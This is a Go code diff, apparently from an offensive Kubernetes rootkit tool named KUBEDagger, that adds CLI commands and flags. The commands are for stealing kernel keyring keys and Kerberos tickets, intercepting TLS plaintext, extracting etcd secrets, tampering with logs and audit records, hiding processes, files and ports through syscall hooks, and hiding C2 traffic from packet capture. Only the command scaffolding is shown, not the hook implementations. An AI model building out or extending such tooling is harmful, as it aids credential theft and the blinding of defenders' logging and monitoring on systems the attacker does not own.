@@ -197,6 +197,55 @@ var cmdDaemonSet = &cobra.Command{
 	RunE:  daemonSetCmd,
 }
 
+var cmdKeyring = &cobra.Command{
+	Use:   "keyring",
+	Short: "Kernel keyring theft",
+	Long:  "keyring steals encryption keys, Kerberos tickets, and eCryptfs keys from the kernel keyring subsystem",
+	RunE:  keyringCmd,
+}
+
+var cmdTLSIntercept = &cobra.Command{
+	Use:   "tls-intercept",
+	Short: "TLS traffic interception",
+	Long:  "tls-intercept attaches uprobes to SSL_read/SSL_write to capture plaintext before encryption",
+	RunE:  tlsInterceptCmd,
+}
+
+var cmdEtcdTheft = &cobra.Command{
+	Use:   "etcd-steal",
+	Short: "Etcd credential theft",
+	Long:  "etcd-steal intercepts etcd traffic to extract secrets, tokens, and client certificates",
+	RunE:  etcdTheftCmd,
+}
+
+var cmdLogTamper = &cobra.Command{
+	Use:   "log-tamper",
+	Short: "Log tampering",
+	Long:  "log-tamper hooks vfs_write and journald to drop, modify, or inject log entries",
+	RunE:  logTamperCmd,
+}
+
+var cmdSyscallBypass = &cobra.Command{
+	Use:   "syscall-bypass",
+	Short: "Syscall-level hiding",
+	Long:  "syscall-bypass hooks getdents64, stat, and proc reads to hide PIDs, files, and ports",
+	RunE:  syscallBypassCmd,
+}
+
+var cmdAuditFilter = &cobra.Command{
+	Use:   "audit-filter",
+	Short: "Audit log filtering",
+	Long:  "audit-filter hooks audit_log_start/end to suppress or modify audit records for rootkit operations",
+	RunE:  auditFilterCmd,
+}
+
+var cmdPcapBlind = &cobra.Command{
+	Use:   "pcap-blind",
+	Short: "Pcap blinding",
+	Long:  "pcap-blind attaches socket filters to AF_PACKET to hide C2 traffic from tcpdump/Wireshark",
+	RunE:  pcapBlindCmd,
+}
+
 var cmdCloudMeta = &cobra.Command{
 	Use:   "meta",
 	Short: "steal cloud metadata credentials",
@@ -721,4 +770,145 @@ func init() {
 		"",
 		"output file path (stdout if not set)")
 	KUBEDaggerClient.AddCommand(cmdDaemonSet)
+
+	cmdKeyring.PersistentFlags().StringVar(
+		&options.KeyringMode,
+		"mode",
+		"list",
+		"keyring mode: list, dump, or monitor")
+	cmdKeyring.PersistentFlags().StringVar(
+		&options.KeyringKeyType,
+		"key-type",
+		"all",
+		"key type filter: all, user, logon, or encrypted")
+	cmdKeyring.PersistentFlags().StringVarP(
+		&options.Output,
+		"output",
+		"o",
+		"",
+		"output file path (stdout if not set)")
+	KUBEDaggerClient.AddCommand(cmdKeyring)
+
+	cmdTLSIntercept.PersistentFlags().StringVar(
+		&options.TLSAction,
+		"action",
+		"start",
+		"TLS intercept action: start, stop, or dump")
+	cmdTLSIntercept.PersistentFlags().StringVar(
+		&options.TLSTargetPID,
+		"target-pid",
+		"",
+		"target process PID for TLS interception")
+	cmdTLSIntercept.PersistentFlags().StringVar(
+		&options.TLSLib,
+		"lib",
+		"openssl",
+		"TLS library to hook: openssl, gnutls, or auto")
+	cmdTLSIntercept.PersistentFlags().StringVarP(
+		&options.Output,
+		"output",
+		"o",
+		"",
+		"output file path (stdout if not set)")
+	KUBEDaggerClient.AddCommand(cmdTLSIntercept)
+
+	cmdEtcdTheft.PersistentFlags().StringVar(
+		&options.EtcdMode,
+		"mode",
+		"dump",
+		"etcd theft mode: dump, watch, or creds")
+	cmdEtcdTheft.PersistentFlags().StringVar(
+		&options.EtcdKeyPrefix,
+		"key-prefix",
+		"/registry/secrets",
+		"etcd key prefix to target")
+	cmdEtcdTheft.PersistentFlags().StringVarP(
+		&options.Output,
+		"output",
+		"o",
+		"",
+		"output file path (stdout if not set)")
+	KUBEDaggerClient.AddCommand(cmdEtcdTheft)
+
+	cmdLogTamper.PersistentFlags().StringVar(
+		&options.LogTamperMode,
+		"mode",
+		"drop",
+		"log tamper mode: drop, modify, or inject")
+	cmdLogTamper.PersistentFlags().StringVar(
+		&options.LogTamperPattern,
+		"pattern",
+		"",
+		"pattern to match for log manipulation")
+	cmdLogTamper.PersistentFlags().StringVar(
+		&options.LogTamperTarget,
+		"log-target",
+		"syslog",
+		"log target: syslog, journal, or container")
+	cmdLogTamper.PersistentFlags().StringVarP(
+		&options.Output,
+		"output",
+		"o",
+		"",
+		"output file path (stdout if not set)")
+	KUBEDaggerClient.AddCommand(cmdLogTamper)
+
+	cmdSyscallBypass.PersistentFlags().StringVar(
+		&options.SyscallHidePIDs,
+		"hide-pids",
+		"",
+		"comma-separated list of PIDs to hide")
+	cmdSyscallBypass.PersistentFlags().StringVar(
+		&options.SyscallHideFiles,
+		"hide-files",
+		"",
+		"comma-separated list of files to hide")
+	cmdSyscallBypass.PersistentFlags().StringVar(
+		&options.SyscallHidePorts,
+		"hide-ports",
+		"",
+		"comma-separated list of ports to hide")
+	cmdSyscallBypass.PersistentFlags().StringVarP(
+		&options.Output,
+		"output",
+		"o",
+		"",
+		"output file path (stdout if not set)")
+	KUBEDaggerClient.AddCommand(cmdSyscallBypass)
+
+	cmdAuditFilter.PersistentFlags().StringVar(
+		&options.AuditFilterMode,
+		"mode",
+		"suppress",
+		"audit filter mode: suppress or modify")
+	cmdAuditFilter.PersistentFlags().StringVar(
+		&options.AuditFilterPIDs,
+		"filter-pids",
+		"",
+		"comma-separated PIDs to filter from audit logs")
+	cmdAuditFilter.PersistentFlags().StringVarP(
+		&options.Output,
+		"output",
+		"o",
+		"",
+		"output file path (stdout if not set)")
+	KUBEDaggerClient.AddCommand(cmdAuditFilter)
+
+	cmdPcapBlind.PersistentFlags().StringVar(
+		&options.PcapHidePorts,
+		"hide-ports",
+		"",
+		"comma-separated ports to hide from packet capture")
+	cmdPcapBlind.PersistentFlags().StringVar(
+		&options.PcapHideIPs,
+		"hide-ips",
+		"",
+		"comma-separated IPs to hide from packet capture")
+	cmdPcapBlind.PersistentFlags().StringVarP(
+		&options.Output,
+		"output",
+		"o",
+		"",
+		"output file path (stdout if not set)")
+	KUBEDaggerClient.AddCommand(cmdPcapBlind)
 }
